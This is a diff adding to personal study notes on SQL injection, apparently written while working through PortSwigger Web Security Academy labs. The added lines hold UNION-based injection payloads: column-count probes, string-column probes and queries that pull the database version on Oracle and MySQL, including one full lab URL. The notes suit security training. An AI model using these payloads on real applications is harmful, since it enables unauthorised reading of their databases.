@@ -56,8 +56,23 @@ UNION needs to return the correct amount of columns and data type.
 We have an idea of where the data is at we need to weaponize an exploit: Playing a bit with not enough data
 Get our count:
 GET /filter?category=Corporate+gifts'+UNION+SELECT+'NULL','NULL'+FROM+dual-- HTTP/1.1   200 OK we have two columns of data. 
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   # You have to go higher than the columns to get an error
 We may want to know Types of data sent:
+Finding the string
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+Solution to get database info:
+https://0a450001049f6a69c215b5f400880062.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+'v$version','NULL'+FROM+dual--
 
+
+
+B. Microsoft, MySQL: 	SELECT @@version
+' SELECT @@version--
+filter?category='+UNION+SELECT+'@@version',@@version--%20            The second one with no quotes is what gets it to work, with quotes no worky
 
 4. Blind SQL injection vulnerabilities
 https://portswigger.net/web-security/sql-injection/blind
